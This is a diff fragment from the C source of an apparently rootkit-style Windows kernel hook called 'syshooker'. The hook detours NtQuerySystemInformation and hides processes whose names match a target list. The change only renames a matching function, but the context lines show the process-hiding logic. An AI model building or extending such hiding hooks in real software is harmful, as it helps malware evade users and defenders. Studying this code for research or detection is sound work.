@@ -110,7 +110,7 @@ NTSTATUS DetourNtQuerySystemInformation(
                 WCHAR ProcessNameBuffer[SYSHOOKER_MAX_NAME_LENGTH] = { 0 };
                 wcsncpy(ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, MIN(ProcessInformationPtr->ImageName.Length, SYSHOOKER_MAX_NAME_LENGTH-1)); // -1 to ensure that the last char is \0
 
-				if (matchMagicNames(ProcessNameBuffer, (Target)TARGET_PROCESS)) {
+				if (matchSyshookerNames(ProcessNameBuffer, (Target)TARGET_PROCESS)) {
 					kprintf("[+] syshooker: NtQuerySystemInformation: Should hide: %ws\n", ProcessNameBuffer);
 					// Not the last process entry
 					if (ProcessInformationPtr->NextEntryOffset > 0) {
